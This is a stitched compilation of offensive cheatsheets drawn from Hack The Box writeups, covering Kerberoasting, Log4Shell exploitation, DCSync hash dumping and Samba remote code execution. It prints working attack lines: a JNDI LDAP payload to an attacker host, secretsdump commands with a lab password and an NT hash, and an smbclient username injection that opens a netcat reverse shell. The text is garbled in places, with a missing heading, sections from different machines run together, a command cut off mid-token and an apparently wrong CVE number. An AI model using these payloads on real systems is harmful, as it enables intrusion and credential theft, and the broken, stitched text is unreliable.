## Kerberoasting in Active Directory

### How It Works
Kerberoasting is an attack against the Kerberos authentication protocol used in Windows Active Directory environments. The process involves:
1.  **Ticket Request**: An attacker with a valid domain account authenticates to the Key Distribution Center (KDC) and requests a Ticket Granting Service (TGS) ticket for a specific service Principal Name (SPN).
2.  **Encryption**: The KDC encrypts the response (the TGS ticket) using the **service account's password hash** (not the user's).
3.  **Offline Brute Force**: Instead of sending the ticket to the service, the attacker captures the encrypted ticket and performs an offline brute-force attack to crack the service account's password.
4.  **Access**: Once the password is cracked, the attacker can authenticate as that service account, often leading to privilege escalation or lateral movement.

*(seen on: htb-active)*

### Related Technique: AS-REP Roasting
While distinct from standard Kerberoasting, AS-REP Roasting is frequently paired with it in HTB writeups. It targets accounts with the **"Do not require Kerberos preauthentication"** flag set.
*   **Mechanism**: The attacker requests an AS-REP (Authentication Service Response) from the KDC without authentication.
*   **Exploitation**: The AS-REP contains a session key encrypted with the user's password hash. The attacker brute-forces this offline to recover the password.
*(seen on: htb-active, htb-sauna, htb-rebound)*

### HTB Machines Demonstrating Kerberoasting

*   **Phase**: Privilege Escalation
*   **Details**: The box is centered around common Active Directory vulnerabilities. It provides an opportunity to practice SMB enumeration and perform Kerberoasting against a Windows Domain. The writeup covers the background of the attack and the AS-REP Roasting variant.
*(seen on: htb-active)*

#### 2. htb-sauna
*   **Phase**: Lateral Movement
*   **Details**: The attacker uses a Kerberoast brute force on usernames to identify users. One user has the flag set to allow AS-REP Roasting. The attacker grabs the hash, cracks it, and gains a shell. Subsequent steps involve BloodHound and DC Sync.

This leads to discovering bad ACLs, cross-session relay attacks, and eventually abusing constrained delegation and RBCD to dump domain hashes.

*(seen on: htb-administrator)*

### Overview
CVE-2021-44228 is a critical vulnerability in the **Log4J** Java logging library that allows for **Remote Code Execution (RCE)**. It is described as one of the most serious vulnerabilities discovered to date. (seen on: htb-crafty)

### Attack Phase: Foothold

#### 1. Exploitation via Minecraft (htb-crafty)
The vulnerability was exploited by sending a malicious JNDI LDAP payload to the Minecraft server.

*   **Tool:** `poc.py` from the `kozmer/log4j-shell-poc` GitHub repository.
*   **Command:**
    ```bash
    python poc.py --userip <ATTACKER_IP> --webport <WEB_PORT> --lport <LISTEN_PORT>
    ```
    *Example from writeup:*
    ```bash
    python poc.py --userip 10.10.14.6 --webport 8000 --lport 443
    ```
*   **Payload Generation:** The tool generates a JNDI LDAP payload:
    ```text
    ${jndi:ldap://<ATTACKER_IP>:1389/a}
    ```
*   **Delivery:** The payload is sent to the Minecraft server chat:
    ```text
    <username> ${jndi:ldap://10.10.14.6:1389/a}
    ```
*   **Exploitation Flow:**
    1.  The tool sets up an LDAP server on port 1389.
    2.  It starts a web server on the specified web port (e.g., 8000) to host the `Exploit.class` file.
    3.  When the victim (Minecraft server) processes the payload, it connects to the LDAP server.
    4.  The LDAP server redirects the victim to the web server to download `Exploit.class`.
    5.  The victim executes the Java class, attempting to connect back to the attacker's listener.

*   **Observed Result on htb-crafty:**
    *   The LDAP server received requests and redirected to `http://10.10.14.6:8000/Exploit.class`.
    *   The web server logged `GET /Exploit.class` requests from the victim IP (`10.10.11.249`).

## DCSync Attack Cheatsheet

### Overview
The DCSync attack allows an attacker to replicate the Active Directory database (NTDS.DIT) from a Domain Controller (DC) as if they were another DC. This requires specific permissions, such as `Replicating Directory Changes` or `Replicating Directory Changes All`, often obtained via Resource-Based Constrained Delegation (RBCD), machine account compromise, or direct administrator privileges.

### Attack Phases & Techniques

#### 1. Prerequisites: Obtaining Replication Rights
Before executing DCSync, the attacker must possess credentials or a Kerberos ticket for an account with replication rights (e.g., Domain Admin, DC Machine Account, or a user with RBCD delegation configured).

*   **RBCD Delegation**: Configure Resource-Based Constrained Delegation to allow a user to impersonate the DC machine account.
    *   *Seen on:* **Vintage** (Path: Shell as L.Bianchi_adm > RBCD Delegation > DCSync)
*   **Machine Account Compromise**: Use the credentials of the DC's machine account (e.g., `DC1$`) to authenticate.
    *   *Seen on:* **Delegate** (Path: Shell as Administrator > DCSync), **Flight** (Path: Shell as administrator > DCSync)
*   **Direct Admin/Privileged User**: Use existing Domain Admin or privileged user hashes/passwords.
    *   *Seen on:* **Sizzle** (Path: Privesc: mrlky -> administrator > DCSync), **Forest** (Path: Forest)

#### 2. Execution: Dumping NTDS.DIT
Once replication rights are established, use Impacket or NetExec to dump the domain hashes.

**Method A: Using Impacket `secretsdump.py`**
*   **With Password:**
    ```bash
    secretsdump.py -just-dc <username>:<password>@<dc_ip>
    ```
    *   *Example (Sizzle):* `secretsdump.py -just-dc mrlky:Football#7@10.10.10.103`
*   **With Hashes (Pass-the-Hash):**
    ```bash
    secretsdump.py -hashes <lmhash>:<nthash> -just-dc <domain>/<username>@<dc_ip>
    ```
    *   *Example (Sizzle):* `secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef -just-dc HTB.LOCAL/mrlky@10.10.10.103`
*   **Output:** Dumps `Administrator`, `krbtgt`, and other user NTLM hashes.

**Method B: Using NetExec (`nxc`)**
*   **With Kerberos Ticket (CCache):**
    1.  Generate or convert a Kerberos ticket (`.kirbi` to `.ccache`) using `kirbi2ccache`.
        *   *Example (Flight):* `kirbi2ccache ticket.kirbi ticket.ccache`
    2.  Export the ticket environment variable:
        ```bash
        export KRB5CCNAME=ticket.ccache
        ```
    3.  Execute DCSync via SMB:
        ```bash
        netexec smb <dc_host> -k --use-kcache --ntds --user <username>
        ```
        *   *Example (Vintage):* `KRB5CC`

# Samba Remote Code Execution Exploitation Cheatsheet

## Foothold

### 1. Samba 'Username' Map Script Command Execution (CVE-2010-0728 / Exploit-DB 16320)
*   **Technique:** Abuse of Samba's `username map script` feature where the username field is passed to a shell command without proper sanitization. Backticks (`` ` ``) in the username allow command execution.
*   **Vulnerability:** Samba 3.0.20 < 3.0.25rc3.
*   **Exploitation Steps:**
    1.  Identify the vulnerable Samba version.
    2.  Use `smbclient` to connect to a share (e.g., `/tmp`).
    3.  Craft a username containing backticks to execute a reverse shell payload.
    4.  **Critical Note:** Use single quotes (`'`) around the username argument in the local shell to prevent local execution of the backticks. Be aware that `smbclient` may capitalize the start of the command, which can break execution if not handled.
*   **Commands:**
    ```bash
    # Start a listener
    nc -lnvp 443

    # Attempt exploit (Note: Single quotes are required to prevent local shell interpretation)
    smbclient //<target_ip>/tmp -U './=`nohup nc -e /bin/sh <attacker_ip> 443`'
    ```
    *   *Observed Issue:* The writeup notes that `smbclient` capitalized the start of the command (`NOHUP`), which broke execution in the manual attempt.
    *   (seen on: htb-lame)

### 2. Samba Printing Subsystem OS Command Injection (CVE-2026-4480)
*   **Technique:** OS command injection via the Samba printing subsystem. The client-controlled job description string is passed to the `print command` setting via the `%J` substitution character without escaping shell meta characters.
*   **Vulnerability:** Samba printing subsystem (CVSS 10.0).
*   **Exploitation Steps:**
    1.  Identify the Samba version and the presence of a print share (e.g., `HP-Reception`).
    2.  Use a Python exploit script to submit a crafted print job.
    3.  The job name/description contains unescaped shell characters that execute a reverse shell.
    4.  The exploit swaps single quotes for underscores but leaves other shell metacharacters intact.
*   **Commands:**
    ```bash
    # Start a listener
    nc -lnvp 445

    # Run the exploit script (requires python3)
    python3 exploit.py <target_ip> <attacker_ip> <attacker_port>
    # Example:
    python3 exploit.py 10.129.244.177 10.10.15.243 445
    ```
    *   **Result:** Shell as `nobody` in `/var/spool/samba`.
    *   (seen on: htb-abducted)
